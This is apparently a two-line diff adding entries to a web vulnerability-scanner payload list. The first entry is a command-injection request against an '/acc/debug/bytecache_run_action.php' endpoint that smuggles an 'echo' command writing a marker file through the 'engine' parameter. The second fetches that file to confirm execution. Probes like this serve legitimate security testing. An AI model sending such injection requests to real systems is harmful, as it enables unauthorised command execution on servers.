@@ -1,0 +1,2 @@
+/acc/debug/bytecache_run_action.php?action=1&engine=test%27|echo%2054dhnbd545845fvbgdtgfn>1.txt||%27a
+/acc/debug/1.txt
